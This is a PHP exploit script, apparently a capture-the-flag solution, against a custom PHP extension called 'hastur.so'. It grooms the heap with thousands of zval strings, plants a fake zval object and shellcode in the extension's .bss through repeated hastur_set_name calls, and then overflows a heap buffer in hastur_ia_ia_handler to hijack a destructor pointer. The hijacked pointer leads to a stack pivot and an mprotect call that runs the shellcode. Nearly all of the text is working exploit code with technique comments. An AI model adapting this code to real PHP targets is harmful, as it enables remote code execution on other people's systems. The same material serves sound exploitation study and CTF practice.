$vals = array();
$count = 0xfff;

/* hastur.so base and libc base */
$hbase = HASTURBASE;
$lbase = LIBCBASE;
$fake_obj_addr= $hbase + 0x3100;
$stack_pivot = $lbase + 0x109d78;
$mprotect = $lbase + 0xe7450;
$shellcode_addr = $hbase + 0x31dc;

/* 
    Fake zval object starts here. The
code looks ugly but a most of it is
writing stuff in "inverse" due to the fact
that we are storing all this in the .bss
of hastur.so through a strncpy() which doesn't
allow nullbytes.

*/

/* Store the shellcode */
$fake_obj = pack("I", $hbase + 0x3100 + 4 * 10);
$fake_obj = str_pad($fake_obj, 0xc4, "Z");
$fake_obj = $fake_obj.str_repeat("\x90", 300);
$fake_obj = $fake_obj.SHELLCODE;
hastur_set_name($fake_obj);

/* The 0x7 of mprotect($hbase + 0x3000, 0x1000, 0x7) */
$fake_obj = pack("I", $hbase + 0x3100 + 4 * 10);
$fake_obj = str_pad($fake_obj, 0xc4, "Z");
$fake_obj = $fake_obj."\x07\x00\x00\x00";
hastur_set_name($fake_obj);

/* The 0x1000 of mprotect($hbase + 0x3000, 0x1000, 0x7) */
$fake_obj = pack("I", $hbase + 0x3100 + 4 * 10);
$fake_obj = str_pad($fake_obj, 0xbe, "Z");
$fake_obj = $fake_obj."\x10\x10\x00";
hastur_set_name($fake_obj);

/* The $hbase + 0x3000 of mprotect($hbase + 0x3000, 0x1000, 0x7) */
/* the 0x41 at the end is to avoid the null byte, we zero it later */
$fake_obj = pack("I", 0xcacacaca);
$fake_obj = str_pad($fake_obj, 0xbc, "Z");
$fake_obj = $fake_obj.pack("I", $hbase + 0x3041);
hastur_set_name($fake_obj);

/* Put the stack pivot */
/* The mprotect() of mprotect($hbase + 0x3000, 0x1000, 0x7) */
/* The return address as the address of our shellcode */
$fake_obj = pack("I", 0xcacacaca);
$fake_obj = str_pad($fake_obj, 0x5c, "Z");

/*
stack_pivot:
0x109d78          94                              xchg   esp,eax
0x109d79          8DB42600000000                  lea    esi,[esi+eiz*1+0x0]
0x109d80          31C0                            xor    eax,eax
0x109d82          83C44C                          add    esp,0x4c
0x109d85          5B                              pop    ebx
0x109d86          5E                              pop    esi
0x109d87          5F                              pop    edi
0x109d88          5D                              pop    ebp
0x109d89          C3                              ret    
*/
$fake_obj = $fake_obj.pack("I", $stack_pivot);
$fake_obj = str_pad($fake_obj, 0xb4, "P");

$fake_obj = $fake_obj.pack("I", $mprotect);
$fake_obj = $fake_obj.pack("I", $shellcode_addr);
hastur_set_name($fake_obj);

/* This is the fake zval object */
/*
struct zval_t{
    obj_t object;	// seems to be zval_refcounted_t ?
    ....
}

struct obj_t{
    ...
    void * func_ptr_obj; // dtor = [[func_ptr_obj] + 4]
    ...
    uint32 refcount; // should be 1, so that when decremented in zval_ptr_dtor() = 0
    ...
    uint32 type; 	 // should be == 5 so that in zval_dtor_func(), it is interpreted
                     // as an OBJECT which has an embedded destructor function pointer.
    uint32 unknown_flag; // should be 0 so that we don't call gc_remove_zval_from_buffer()
    ...
}

*/

/* The type field  and unknown_flag */
$fake_obj = pack("I", 0xcacacaca);
$fake_obj = str_pad($fake_obj, 52, "Z");
$fake_obj = $fake_obj."\x05\x00\x00\x00\x00\x00\x00";
hastur_set_name($fake_obj);

/* The func_ptr_obj and the refcount */
$fake_obj = pack("I", $fake_obj_addr + 0x28);
$fake_obj = str_pad($fake_obj, 44, "Z");
$fake_obj = $fake_obj.pack("I", $fake_obj_addr + 0x58);
$fake_obj = $fake_obj."\x01\x00\x00";
hastur_set_name($fake_obj);

/* Create a number of zval objects */
for($x = 0; $x <= $count; $x++){
    $vals[$x] = "HasturHastur!!!" . $x;    
}

/* Put some holes to give us a chance to land between some */
for($x = 0; $x <= $count; $x++){
    if(($x % 10) == 0){
        unset($vals[$x]);    
    }
}


/* 
    Trigger the heap overflow and overwrite a zval object pointer
which will be passed to zval_ptr_dtor(). Our fake zval object
is stored in the .bss of the hastur.so.
*/
$name = "Dan Blair";
$text = str_repeat("Z", 19)."\x00";
$text = str_pad($text, 136, "Z");
$text = $text.pack("I", $fake_obj_addr);
$text = str_pad($text, 48, "Z");
echo hastur_ia_ia_handler($text, "asdf");

/* Destruction of objects are automatically triggered at script end */
